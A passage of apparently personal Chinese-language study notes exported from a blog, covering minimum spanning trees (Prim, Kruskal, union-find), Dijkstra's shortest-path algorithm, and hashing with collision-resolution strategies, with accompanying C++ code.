<li>若$e$为环路上的最长边，则e不可能属于$N’$的MST,此时,e不可能属于$N’$的MST,此时，$f=e,T-{f}+{e}=T$依然是$N’$的MST</li>
<li>否则有$|e|\leq |f|$,移除后$T-{f}$一分为二，对应于$N/N’$的割</li>
</ul>
<p>此割在$N$和$N’$中导出的一对互补子图完全一致，在$N/N’$中，$f/e$应是该割的极短跨越边，故这对子图各自的MST经联接后，即是$N’$的一棵MST。</p>
<blockquote>
<p>在MST不唯一时，由极短跨边构成的支撑树，未必就是一棵MST</p>
</blockquote>
<p>同一割可能同时拥有多条极短跨越边，以下证明可说明prim算法的正确性，即</p>
<blockquote>
<p>只要$T_{k}$是某棵最小支撑树的子树，则$T_{k+1}$也必然是(尽管可能与前一棵子树不同)极小支撑树的子树。</p>
</blockquote>
<p>假定$T_{k}$是某棵最小支撑树T的子集，</p>
<ul>
<li>若$e\in T$,则$E\cup{e}$必然为最小支撑树T的子集</li>
<li>设$e=(u,v)$，那么在$T$中必然存在从$u$到$v$的路径(树的性质)；$u$,$v$必然存在于$(S,V-S)$的两个点集里，于是这条路径上必有某条边$(x,y)$同样跨越割</li>
</ul>
<p>类似之前的操作，令$T’=T-{(x,y)}\cup{(u,v)}$</p>
<p>那么$T’$仍然是一棵最小支撑树，$w(u,v)\leq w(x,y)$</p>
<p>因此，$w(T’)=w(T)-w(x,y)+w(u,v)\leq w(T)$</p>
<p>由于$T$为最小支撑树，所以$w(T)\leq w(T’)$，所以$T$’同样为最小生成树。</p>
<blockquote>
<p>对于权值不为正数的网络，prim算法是否仍然可行</p>
</blockquote>
<p>依然可行，首先确认带负权边的网络依然拥有最小支撑树，可统一增加某个值使得所有边的权值为正，得到G’,G’的每一支撑树和G的每一支撑树必然一一对应，均相差一个常数。</p>
<blockquote>
<p>同一割的跨边可能不止采用一次</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//Prim算法：无向连通图，各边表示为方向互逆、权重相等的一对边</span></span><br><span class="line"><span class="keyword">void</span> Graph&lt;Tv, Te&gt;::prim ( <span class="keyword">int</span> s ) &#123; <span class="comment">//assert: 0 &lt;= s &lt; n</span></span><br><span class="line">   reset(); priority ( s ) = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++ ) &#123; <span class="comment">//共需引入n个顶点和n-1条边</span></span><br><span class="line">      status ( s ) = VISITED;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="number">-1</span> != parent ( s ) ) type ( parent ( s ), s ) = TREE; <span class="comment">//引入当前的s</span></span><br><span class="line">      <span class="keyword">for</span> ( <span class="keyword">int</span> j = firstNbr ( s ); <span class="number">-1</span> &lt; j; j = nextNbr ( s, j ) ) <span class="comment">//枚举s的所有邻居j</span></span><br><span class="line">         <span class="keyword">if</span> ( ( status ( j ) == UNDISCOVERED ) &amp;&amp; ( priority ( j ) &gt; weight ( s, j ) ) ) <span class="comment">//对邻接顶点j做松弛</span></span><br><span class="line">            &#123; priority ( j ) = weight ( s, j ); parent ( j ) = s; &#125; <span class="comment">//与Dijkstra算法唯一的不同之处</span></span><br><span class="line">      <span class="keyword">for</span> ( <span class="keyword">int</span> shortest = INT_MAX, j = <span class="number">0</span>; j &lt; n; j++ ) <span class="comment">//选出下一极短跨边</span></span><br><span class="line">         <span class="keyword">if</span> ( ( status ( j ) == UNDISCOVERED ) &amp;&amp; ( shortest &gt; priority ( j ) ) )</span><br><span class="line">            &#123; shortest = priority ( j ); s = j; &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="class"><span class="keyword">struct</span> <span class="title">PrimPU</span> &#123;</span> <span class="comment">//针对Prim算法的顶点优先级更新器</span></span><br><span class="line">   <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span> <span class="params">( Graph&lt;Tv, Te&gt;* g, <span class="keyword">int</span> uk, <span class="keyword">int</span> v )</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> ( UNDISCOVERED == g-&gt;status ( v ) ) <span class="comment">//对于uk每一尚未被发现的邻接顶点v</span></span><br><span class="line">         <span class="keyword">if</span> ( g-&gt;priority ( v ) &gt; g-&gt;weight ( uk, v ) ) &#123; <span class="comment">//按Prim策略做松弛</span></span><br><span class="line">            g-&gt;priority ( v ) = g-&gt;weight ( uk, v ); <span class="comment">//更新优先级（数）</span></span><br><span class="line">            g-&gt;parent ( v ) = uk; <span class="comment">//更新父节点</span></span><br><span class="line">         &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在带权网络存在多条相等的边(同为某一割的极短跨越边)时，可能存在歧义</p>
<p>若带权网络均为整数权重，则可通过给每条边的权重增加一个扰动量来消除歧义，如此构造的W’中各边的权重必然互异，其最小支撑树必然唯一。</p>
<p>设原图共含$v$个顶点、$e$条边，不妨假定$v-1&lt;e$。若各边权重(按照输入次序)依次为</p>
<p>$W=[w_{1},w_{2},..w_{e}]$</p>
<p>且不妨设各边权重不至完全相等，则可将其替换为：</p>
<p>$W=[w_1+1/e^{2},w_2+2/e^2,..,w_e+e/e^2]$</p>
<p>各边权重均有所增加，且增量为以$1/e^2$为公差的算术级数。</p>
<p>所有各边的扰动量总和不超过：</p>
<p>$(1+2+3+…+e)/e^2=(1+e)/2e&lt;1$</p>
<p>即便在$W$中存在等权的边，在如此构造的$W$’中各边的权重必然互异。于是由prim算法构造的最小支撑树必然唯一确定。于是，$W’$的任一支撑树都应满足都应满足</p>
<p>$|T_{m}’|\leq |T’|$</p>
<p>$\lfloor |T_{m}’|\rfloor \leq \lfloor  |T’| \rfloor$</p>
<p>既然$|W|=|W’|=e$,故二者的支撑树必然存在一一对应的关系。</p>
<p>考查如此对应的每一对支撑树$T$和$T’$。既然它们各自都恰好包含$v-1$条边，故应有：</p>
<p>$0&lt;|T’|-|T|&lt;(v-1)(1/e) \leq 1$</p>
<p>必有：</p>
<p>$\lfloor  |T’| \rfloor=\lfloor  |T| \rfloor$</p>
<p>特别地，设与$T_m’$对应的支撑树为$T_m$，则也应有：</p>
<p>$\lfloor  |T_{m}’| \rfloor=\lfloor  |T_{m}| \rfloor$</p>
<p>$|T_m|=\lfloor |T_{m}’|\rfloor \leq \lfloor  |T’| \rfloor=|T|$</p>
<p>由此可见，$T_m$必然是$w$的一棵最小支撑树。</p>
<p>以上方法之所以行之有效，是因为事先在不等权的边之间确定边权重的最小差值，从而保证W’的各权重互异，同时又能保证通过向下取整运算，从而从$|T’|$确定相应的$|T|$。若权重可以取自任何实数，则这两个性质无法兼顾。</p>
<p>当然，可推广至浮点数的情况，先将浮点数通过统一的放缩，将各边的权重转换为整数。</p>
<p>基于优先级队列，我们可以设计如下算法：</p>
<p>首先花费$O(n)$时间将起点$s$与其余顶点之间的$n-1$条边组织为一个优先级队列H。此后每一步迭代中，只需$O(logn)$时间即可从H中取出优先级数最小的边，并将对应的节点转入最小支撑树中。</p>
<p>取出每个节点需要$O(logn)$时间，删除操作，下滤，累计需要$O(nlogn)$时间。</p>
<p>所有顶点的所有邻接顶点的松弛，优先级增加，上滤，在最坏情况下累计需要$O(elogn)$时间。</p>
<p>如此改进以后，prim算法的效率为$O((n+e)logn)$ 。</p>
<h2 id="kruskal算法"><a href="#kruskal算法" class="headerlink" title="kruskal算法"></a>kruskal算法</h2><p>krusal算法将每个顶点视作一棵树，并将所有边按权重非降排序，依次考查各边，只要其端点分属于不同的树，则引入该边，并将端点所分别归属的树合二为一，如此迭代，累计已引入$n-1$条边时，即得到一棵最小生成树。</p>
<blockquote>
<p>算法过程中引入的每一条边，都是某一割的极短跨越边，因此必定属于某棵极小支撑树。</p>
</blockquote>
<p>设$e=(u,v)$的引入导致树$T$和$S$的合并，将$(T;V/T)$视作原网络$N$的割，则$e$当属该割的一条跨边。</p>
<p>在确定应引入$e$时，该割的所有跨边都经kruskal考察，且只可能因为不短于$e$而被淘汰。</p>
<p>故$e$属于该割的一条极短跨边。</p>
<p>与prim同理，以上论述同样不充分。以下论述则为充分证明：</p>
<blockquote>
<p>kruskal算法过程中不断生长的森林，总是某棵MST的子图</p>
</blockquote>
<p><strong>时间复杂度分析</strong></p>
<p>若全排序，则将耗时$O(eloge)=O(n^2logn)$</p>
<p>实际上，大多数情况下只需要考虑前$O(n)$条边。</p>
<p>将所有边组织为优先队列</p>
<p>建堆，$O(e)$</p>
<p>删除并复原，共迭代$O(e)$次,实际中远远小于$e$，尤其对于稠密图</p>
<p>总共=$O(e)+O(elog n)=O(elogn)$</p>
<blockquote>
<p>如何高效地检查回路？</p>
</blockquote>
<p><strong>并查集</strong></p>
<p>给定一组互不相交的等价类，由各自的一个成员为代表</p>
<p>初始时各包含一个元素</p>
<p><code>find(x)</code> 找到元素x的等价类</p>
<p><code>union(x,y)</code> 合并x和y所属等价类</p>
<p><code>kruskal</code>算法迭代过程中所涉及的计算无非两类：</p>
<ul>
<li>查询元素x对应的等价类</li>
<li>将元素y所属的等价类(子树)，并入元素y所属的等价类(子树)</li>
</ul>
<p>并查集中的等价类，为某一全集的若干不相交子集。最初状态下，每个元素自成一个子集，并以该元素作为标识，每经过一次<code>union(x,y)</code>操作，都将元素y所属的子集归入元素x所属的子集，并继续沿用元素x此前的标识。</p>
<p>仿照父子节点表示法，将每个子集组织为一棵多叉树，并令所有多叉树共存于一个向量中。子集合并即对应树的合并，元素所属的子集即是所属的树，也对应该树的根。</p>
<p><code>find(x)</code>查找问题也就转化为了在多叉树中查找节点的问题，沿着<code>paren</code>t指针依次上行，直到最高祖先。</p>
<p>为了有效控制树高，可采取低者优先归入高者的策略，也就是比较待合并树的高度，并倾向于将更低者归入更高者。为此需要给每个节点增加一个域，动态记录树的高度。</p>
<p>有效控制树高的另一策略是路径压缩，在每次查找的过程中将上行通路的沿途节点取出，并作为树根的孩子重新介入树中。</p>
<h1 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h1><p>若以带权图来表示真实的通讯、交通、物流或社交网络，则各边的权重可代表信道成本、交通运输费用或交往程度。给定有向图G及其中的顶点u和v，找到从u到v的最短路径和长度即为最短路径问题。</p>
<p>对旅游者来说，最短路径意味着最经济的出行路线，对路由器来说，最短路径意味着最快将数据包传送至指定位置。</p>
<h2 id="问题分类"><a href="#问题分类" class="headerlink" title="问题分类"></a>问题分类</h2><p><strong>单源点到各顶点的最短路径</strong></p>
<p>给定顶点$x$，计算$x$到其余各个顶点的最短路径及其长度</p>
<p><strong>所有顶点对之间的路径</strong></p>
<p>找出每个顶点$i$和$j$之间的最短路径及长度</p>
<h2 id="最短路径树"><a href="#最短路径树" class="headerlink" title="最短路径树"></a>最短路径树</h2><p>在连通图中，$s$到每个顶点都有至少一条最短路径，任何路径的最短前缀也必定为一条最短路径。在任意带权网络中，考查从源点到其余顶点的最短路径(若有多条，选取其一)，就同一起点额如烟，所有最短路径的并不含回路，因此必构成一棵树。</p>
<h2 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h2><p>按照到$s$的最短距离，对其余的顶点排序</p>
<p>$dist(s,u_1)\leq dist(s,u_2) \leq …\leq dist(s,u_{n-1})$</p>
<p>沿着任一最短路径，各顶点到$s$的最短距离单调变化，$u_1$必定直接与$s$相连，为了找到$u_1$，只需在与$s$关联的各顶点之间找到对应权值最小者。</p>
<p>每一个顶点$u_{k+1}$都是$T_{k}$之外距离s最近者，由此引出贪心迭代算法。与prim算法不同，考虑距离为到s的距离而不是到$T_{k}$的距离。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//最短路径Dijkstra算法：适用于一般的有向图</span></span><br><span class="line"><span class="keyword">void</span> Graph&lt;Tv, Te&gt;::dijkstra ( <span class="keyword">int</span> s ) &#123; <span class="comment">//assert: 0 &lt;= s &lt; n</span></span><br><span class="line">   reset(); priority ( s ) = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++ ) &#123; <span class="comment">//共需引入n个顶点和n-1条边</span></span><br><span class="line">      status ( s ) = VISITED;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="number">-1</span> != parent ( s ) ) type ( parent ( s ), s ) = TREE; <span class="comment">//引入当前的s</span></span><br><span class="line">      <span class="keyword">for</span> ( <span class="keyword">int</span> j = firstNbr ( s ); <span class="number">-1</span> &lt; j; j = nextNbr ( s, j ) ) <span class="comment">//枚举s的所有邻居j</span></span><br><span class="line">         <span class="keyword">if</span> ( ( status ( j ) == UNDISCOVERED ) &amp;&amp; ( priority ( j ) &gt; priority ( s ) + weight ( s, j ) ) ) <span class="comment">//对邻接顶点j做松弛</span></span><br><span class="line">            &#123; priority ( j ) = priority ( s ) + weight ( s, j ); parent ( j ) = s; &#125; <span class="comment">//与Prim算法唯一的不同之处</span></span><br><span class="line">      <span class="keyword">for</span> ( <span class="keyword">int</span> shortest = INT_MAX, j = <span class="number">0</span>; j &lt; n; j++ ) <span class="comment">//选出下一最近顶点</span></span><br><span class="line">         <span class="keyword">if</span> ( ( status ( j ) == UNDISCOVERED ) &amp;&amp; ( shortest &gt; priority ( j ) ) )</span><br><span class="line">            &#123; shortest = priority ( j ); s = j; &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="comment">//对于无向连通图，假设每一条边表示为方向互逆、权重相等的一对边</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="class"><span class="keyword">struct</span> <span class="title">DijkstraPU</span> &#123;</span> <span class="comment">//针对Dijkstra算法的顶点优先级更新器</span></span><br><span class="line">   <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span> <span class="params">( Graph&lt;Tv, Te&gt;* g, <span class="keyword">int</span> uk, <span class="keyword">int</span> v )</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> ( UNDISCOVERED == g-&gt;status ( v ) ) <span class="comment">//对于uk每一尚未被发现的邻接顶点v，按Dijkstra策略</span></span><br><span class="line">         <span class="keyword">if</span> ( g-&gt;priority ( v ) &gt; g-&gt;priority ( uk ) + g-&gt;weight ( uk, v ) ) &#123; <span class="comment">//做松弛</span></span><br><span class="line">            g-&gt;priority ( v ) = g-&gt;priority ( uk ) + g-&gt;weight ( uk, v ); <span class="comment">//更新优先级（数）</span></span><br><span class="line">            g-&gt;parent ( v ) = uk; <span class="comment">//并同时更新父节点</span></span><br><span class="line">         &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>若节点之间存在负权重，则<code>dijkstra</code>不可行。任意两点之间通路数目有限，其中最短者仍然存在，故最短路径树依然存在，但是<code>dijkstra</code>树在此时未必可行。可在pfs优先级更新时，不再忽略非<code>undiscovered</code>节点，一旦优先级有所增加，则随即恢复为<code>undiscovered</code>状态，进而参加下一节点的候选，时间复杂度同样因此提高。</p>
<p>即便带权网络中不含权重相等的边，其最短路径树依然可能不唯一。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>词典</title>
    <url>/algorithm/hash/</url>
    <content><![CDATA[<p>借助数据结构来表示和组织的数据结构，将所有数据视作一个整体统筹处理，进而提高信息访问的规范性及其处理的效率。例如，借助关键码查找和访问数据元素，其中最典型的例子即为词典。逻辑上的词典，为由一组数据构成的集合，其中各元素都是由关键码和数据项合成的词条。</p>
<a id="more"></a>

<p>映射和词典一样，也是词条的集合，二者的差异仅在于，映射要求不同词条的关键码互异，而词典则允许多个词条拥有相同的关键码。除了静态查找，映射和词典都支持动态更新，二者均统称为符号表。符号表并不要求词条之间可根据关键码比较大小，也不需要按照大小次序来组织数据项。以散列表为代表的符号表结构，转而根据数据项之间的数值，直接做逻辑查找和物理定位。在此类结构中，关键码和数值的地位等同，这种数据访问方式即为循值访问。为了循值访问，在符号表内部仍需强制地在数据对象的数值与其物理地址之间建立某种关联。</p>
<h1 id="应用情景"><a href="#应用情景" class="headerlink" title="应用情景"></a>应用情景</h1><p>散列以最基本的向量作为底层支撑结构，通过适当的散列函数在词条的关键码与向量单元的秩之间建立映射关系。只要散列表、散列函数、冲突排解策略安排得当，可在期望的常数时间内实现词典的所有接口操作。</p>
<p><strong>电话查询系统</strong></p>
<p>假设某大学拟建立一个电话簿查询系统，由电话号码查询机主信息，</p>
<p>蛮力：使用数组，按电话号码索引，静态的查找和动态的删除仅需要常数时间。</p>
<p>在使用8位编号系统时，可能的电话门数可能达到$10^8$次，而该校所有人员涉及的电话门数仅为25000门。上述方案使用的数组长度大致与$10^8$相当,此时的空间有效利用率仅为$25000/10^8=0.025$%，绝大部分空间处于闲置状态。</p>
<p>此类问题在实际应用中非常常见，共同特点可归纳为：尽管词典实际需要保存的词条数N远远少于可能出现的词条数R，但是R个词条中任何一个均有可能出现在此词典中。</p>
<p>散列表是散列方法的底层基础，逻辑上由一系列可存放词条的单元组成，故这些单元也被称为桶或桶单元，与之对应地，各桶单元也应按照其逻辑次序在物理上连续排列，往往用向量(数组)实现。此时地散列表亦称作桶数组。</p>
<p>设桶数组的大小为M，则$N&lt;M&lt;&lt;R$，空间$=O(N+M)=O(N)$。</p>
<h1 id="散列函数"><a href="#散列函数" class="headerlink" title="散列函数"></a>散列函数</h1><p>一组词条在散列表内部的分布取决于散列方案，即事先在词条与桶地址之间定义某种映射关系，可描述为从关键码空间到桶地址空间的函数。</p>
<p><code>hash():key-&gt;hash(key)</code></p>
<p>这里的<code>hash()</code>称作散列函数，<code>hash(key)</code>称作key的散列地址，即与关键码key相对应的桶在散列表中的秩。</p>
<p>例如，某学校学生学号为10160000到10163999,则可直接使用一个长度为4000的散列表A[0~3999]，并取</p>
<p><code>hash(key)=key-10160000</code></p>
<p>从而将学号为x的学生学籍词条存放于桶单元A[hash(x)]。</p>
<p>如此之后，根据任一合法学号，都可在常数时间内确定其散列地址，并完成一次查找、插入或删除。</p>
<p>同义词，key1不等于key2，<code>hash(key1)=hash(key2)</code>。</p>
<blockquote>
<p>是否存在某种定址方法，保证不出现冲突(消除同义词)，即散列函数等效于一个单射。</p>
</blockquote>
<p>在关键码满足某些条件时，的确可以实现单射式散列。对于已知且固定的关键码集，可实现完美散列，采用两级散列，仅需$O(n)$空间，关键码之间互不冲突。一般情况下，完美散列无法保证存在。</p>
<p><strong>设计原则</strong></p>
<p>作为一个比较好的散列函数，应该具备以下特性：</p>
<ul>
<li>确定性，无论所含的数据项如何，词条E在散列表中的映射地址完全取决于关键码</li>
<li>映射过程不可过于复杂，从而使查询和修改操作可在常数时间内完成</li>
<li>所有关键码经过映射后应尽量覆盖整个地址空间[0,M),充分利用有效的散列表空间，即hash()最好是满射</li>
</ul>
<p>定义域规模R远远大于取值域规模M,hash()不可能是单射。这意味着散列冲突在所难免。最为重要的一条原则就是关键码映射到各桶的概率应尽量接近于1/M，若关键码独立均匀分布，这也是任意一对关键码相互冲突的概率。整体而言，等效于将关键码空间均匀地映射到散列地址空间，从而避免极短低效的情况。总之，随机越强、规律性越弱的散列函数越好。</p>
<h2 id="除余法"><a href="#除余法" class="headerlink" title="除余法"></a>除余法</h2><p><code>hash(key)=key % M</code></p>
<p>一般地，散列表长度$M$与词条关键码间隔$T$之间的公约数越大，发生冲突的可能性也越大。在实际应用中，对同一词典的访问往往具有某种周期性，若其周期与$M$有公共的因子，则冲突的概率将急剧攀升。若$M$为素数时，对于严格或大致等间隔的关键码序列，也不会出现冲突激增的情况。同时，数据对散列表的覆盖最充分，分布最均匀。</p>
<p>若取$M=2^k$，则对任何词条都有：</p>
<p><code>key%M=key &amp;(M-1)=key &amp; 00...001111..11</code></p>
<p>此时采用模余法的效果，等同于从key的展开式中截取末尾的$k$个比特。词条key中更高的其余比特位对散列的位置没有任何影响，从而在很大程度上降低了散列的随机性和均匀性。</p>
<blockquote>
<p>假定散列表长度为$M$，采用除余法，若从空开始将间隔为$T$的$M$个关键码插入其中，若$g=gcd(M,T)$为$M$和$T$的最大公约数，则每个关键码大约与$g$个关键码冲突</p>
</blockquote>
<p>这一组关键码序列依次构成一个等差数列，其公差为$T$。不失一般性，设他们分别是：</p>
<p>${0,T,2T,3T,…,(M-1)T}$</p>
<p>按照模余法，任何一对关键码相互冲突，当且仅当它们关于散列表长$M$，属于同一同余类。$g$为$M$和$T$的最大公约数，故相对于$M$而言，这些关键码来自于$M/g$个同余类。每一类各有彼此冲突的$g$个关键码。例如，其中0所属的同余类为：</p>
<p>${0,TM/g,2TM/g,3TM/g,…,(g-1)TM/g}$</p>
<p>散列表的$M$个桶与$M$的$M$个同余类一一对应。既然此时的关键码只能来自其中M/g个同余类，故必有M-M/g个桶闲置，空间利用率不超过：$\displaystyle \frac{M/g}{M}=1/g$</p>
<p><strong>除余法的缺陷</strong></p>
<ol>
<li>不动点：无论表长M取值如何，总有<code>hash(0)=0</code></li>
<li>零阶均匀：$[0,R)$的关键码，平均分配至$M$个桶，但相邻关键码的散列地址也必相邻</li>
</ol>
<h2 id="MAD法"><a href="#MAD法" class="headerlink" title="MAD法"></a>MAD法</h2><p>一阶均匀：邻近的关键码，散列地址不再邻近</p>
<p>取M为素数,$a&gt;0$,$b&gt;0$,$a%M!=0$，</p>
<p>$hash(key)=(a*key+b)%M$</p>
<p>当然，某些条件下未必需要更高阶的均匀性。</p>
<h2 id="数字分析法"><a href="#数字分析法" class="headerlink" title="数字分析法"></a>数字分析法</h2><p>从关键码key特定进制的展开中取特定的若干位，构成一个整形地址。比如，取十进制表示的奇数位，$hash(123456789)=13579$</p>
<h2 id="平方取中法"><a href="#平方取中法" class="headerlink" title="平方取中法"></a>平方取中法</h2><p>从关键码key的平方的十进制或二进制展开中取居中的若干位，构成一个整形地址。</p>
<h2 id="折叠法"><a href="#折叠法" class="headerlink" title="折叠法"></a>折叠法</h2><p>将关键码的十进制或二进制展开分割为等宽的若干段，经异或运算后得到散列地址。</p>
<h2 id="位异或法"><a href="#位异或法" class="headerlink" title="位异或法"></a>位异或法</h2><p>将特定的二进制展开分割为等宽的若干段，经异或运算得到地址</p>
<p>总之，越是随机，越是没有规律越好。</p>
<h2 id="伪随机数法"><a href="#伪随机数法" class="headerlink" title="伪随机数法"></a>伪随机数法</h2><p>散列函数和目标与随机数的目标一致，所以通过随机数法映射地址：</p>
<p>$hash(key)=rand(key)%M$</p>
<h1 id="散列码转换"><a href="#散列码转换" class="headerlink" title="散列码转换"></a>散列码转换</h1><p>作为词典的散列表结构，既不能假定词条关键码所属的类型天然地支持大小比较，更不应将关键码仅限定为整数类型。为扩大散列奇数地适用范围，散列函数hash()需要将任一类型的关键码映射为地址空间$[0,M)$内的一个整数hash(key)，通常可分解为两步</p>
<ul>
<li>利用某一种散列码转换函数<code>hashcode()</code>将关键码key统一转换为一个整数，称为散列码</li>
<li>再利用散列函数将散列码映射为散列地址</li>
</ul>
<p>那么，这里的散列转换函数<code>hashCode()</code>支持什么条件呢？</p>
<p>为支持后续尺度不同的散列空间，取值范围应覆盖系统所支持的最大整数范围，其次，各关键码经hashCode()映射后所得的散列码，相互之间的冲突也应尽可能减少，否则，这一阶段出现的冲突后一阶段将无法消除。</p>
<h2 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h2><p>对于<code>byte</code>,<code>short</code>,<code>int</code>和<code>char</code>等本身即可表示为不超过32位整数的数据类型，可直接将它们的这种表示作为散列码。比如，可通过类型强制转换为32位整数。</p>
<h2 id="多项式法"><a href="#多项式法" class="headerlink" title="多项式法"></a>多项式法</h2><p>与一般的组合对象不同，字符串各字符之间的次序具有特定含义，在散列码转换时务必考虑它们之间的次序。以英文为例，同一组字母往往可组成意义完全不同的多个单词，比如stop和tops等。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">hashCode</span> <span class="params">( <span class="keyword">char</span> s[] )</span> </span>&#123; <span class="comment">//生成字符串的循环移位散列码（cyclic shift hash code）</span></span><br><span class="line">   <span class="keyword">int</span> h = <span class="number">0</span>; <span class="comment">//散列码</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> n = <span class="built_in">strlen</span> ( s ), i = <span class="number">0</span>; i &lt; n; i++ ) <span class="comment">//自左向右，逐个处理每一字符</span></span><br><span class="line">      &#123; h = ( h &lt;&lt; <span class="number">5</span> ) | ( h &gt;&gt; <span class="number">27</span> ); h += ( <span class="keyword">int</span> ) s[i]; &#125; <span class="comment">//散列码循环左移5位，再累加当前字符</span></span><br><span class="line">   <span class="keyword">return</span> ( <span class="keyword">size_t</span> ) h; <span class="comment">//如此所得的散列码，实际上可理解为近似的“多项式散列码”</span></span><br><span class="line">&#125; <span class="comment">//对于英语单词，&quot;循环左移5位&quot;是实验统计得出的最佳值</span></span><br></pre></td></tr></table></figure>
<p>若简单地将各字母分别对应到整数，并将其总和作为散列码，则很多单词将相互冲突。为计入各字符之间出现的相对次序，可取常数$a \geq 2$,并将$x_0x_1…x_{n-1}$的散列码取作：</p>
<p>$x_0a^{n-1}+x_1a^{n-2}+…+x_{n-2}a^1+x_{n-1}$</p>
<p>依次将字符串中的每个字符视为一个多项式的各项系数，故亦称为多项式散列码。其中的常数a非常关键，为了尽可能多地保留原字符串的信息以减少冲突，其低比特位不得全为0。针对不同类型的字符串，应通过实验确定a的最佳取值。</p>
<h1 id="开散列"><a href="#开散列" class="headerlink" title="开散列"></a>开散列</h1><p>散列表中很大概率会有冲突，所以必须制定一套有效的对策，以处理和排解时常发生的冲突。</p>
<h2 id="多槽位法"><a href="#多槽位法" class="headerlink" title="多槽位法"></a>多槽位法</h2><p>将彼此冲突的每一组词条组织为一个小规模的词典，分别存放于它们共同对应的桶单元中。比较简便的一种方法是，统一将各桶细分为更小的称作槽位的单元，每一组槽位可组织为向量或列表。只要槽位数目不多，仍可保证常数复杂度。</p>
<p>但是绝大多数槽位都处于空闲状态，若每个桶都被细分为$k$个槽位，则当散列表总共存有$n$个词条时，装填因子</p>
<p>$\lambda’ = N/(kM)=\lambda /k$ 将降低至原来的$1/k$。</p>
<p>其次，很难在事先确定槽位应细分到何种程度，方可保证在任何情况下都够用，在极端情况下，可能所有(或接近所有)词条都冲突于单个桶单元。尽管几乎其余所有的桶都会处于空闲状态，该桶却会因为冲突过多而溢出。</p>
<h2 id="独立链法"><a href="#独立链法" class="headerlink" title="独立链法"></a>独立链法</h2><p>每个桶存放一个指针，冲突的词条组织成列表。</p>
<p>各子词典的规模往往不大，大多数往往只含单个词条或者甚至是空的。无需为每个桶预留多个槽位，任意多次的冲突都可解决。可更为灵活地动态调整各子词典地容量和规模，删除操作实现简单、统一。</p>
<p>但是指针需要额外空间，节点也需要动态申请。一旦发生冲突，则需要遍历整个列表，导致查找成本的增加。对于列表结构来说，空间未必连续分布，系统缓存几乎失效。</p>
<h2 id="公共溢出区法"><a href="#公共溢出区法" class="headerlink" title="公共溢出区法"></a>公共溢出区法</h2><p>单独开辟一块连续空间，发生冲突的词条，顺序存入此区域。</p>
<p>不冲突则已，一旦发生冲突，处理冲突词条的时间正比于溢出区的规模。</p>
<h1 id="闭散列"><a href="#闭散列" class="headerlink" title="闭散列"></a>闭散列</h1><p>就逻辑结构而言，独立链等策略便捷紧凑，但因需要引入次级关联结构，不能保证物理上的关联性，在查找过程中需要更多的I/O操作。实际上，仅仅依靠基本的散列表结构，就地排解冲突，反而是更好的选择。在冲突时允许在散列表内部寻找另一空桶存放，如此，各桶并非只能存放特定的一组词条。从理论上来说，每个桶单元可存放任一词条，所以这一策略也称作开放定址，同时，因为可用的散列地址仅限于散列表覆盖的范围内，所以亦称作闭散列。</p>
<h2 id="线性试探法"><a href="#线性试探法" class="headerlink" title="线性试探法"></a>线性试探法</h2><p>在插入关键码key时，若发现ht[hash(key)]被占用，则转而试探ht[hash(key)+1]，若ht[hash(key)+1]被占用，则进一步试探ht[hash(key)+2],…,如此知道发现一个可用空桶。为了确保桶地址合法，最后还需要对M统一取余，第i次试探的桶单元应为：ht[(hash(key)+i)mod M],i=1,2,3…</p>
<p>如此，被试探的桶单元在物理空间上依次连贯，地址构成等差数列。</p>
<p><strong>查找链</strong></p>
<p>散列表每一组相互冲突的词条将视为一个有序序列，对其中任意一员的查找都需要借助这一序列。对应的查找过程，可能终止于三种情况：</p>
<ul>
<li>在当前桶单元命中目标关键码，则成功返回</li>
<li>当前桶单元为空，但其中关键码与目标关键码不等，则须转入下一桶单元继续试探</li>
<li>当前桶单元为空，则查找以失败返回</li>
</ul>
<p>对于长度为n的查找链，失败查找长度为n+1，在等概率假设下，平均成功查找长度为$\lceil n/2 \rceil$</p>
<p>相互冲突的关键码必定属于同一查找链，但是同一查找链的关键码却未必相互冲突。究其原因在于，多组各自冲突的关键码，有可能相互交织和重叠。此时，各组关键码的查找长度将进一步增加。</p>
<p><strong>局部性</strong></p>
<p>线性查找法组成各查找链的词条，在物理上保证一定的连贯性，具有良好的数据局部性，故系统缓存的作用可以充分发挥，查找过程中几乎无需I/O操作。尽管闭散列策略同时也会在一定程度上增加冲突发生的可能，但只要散列表的规模不是很小，装填因子不是很大，对于I/O负担的降低而言，这些问题都将微不足道。</p>
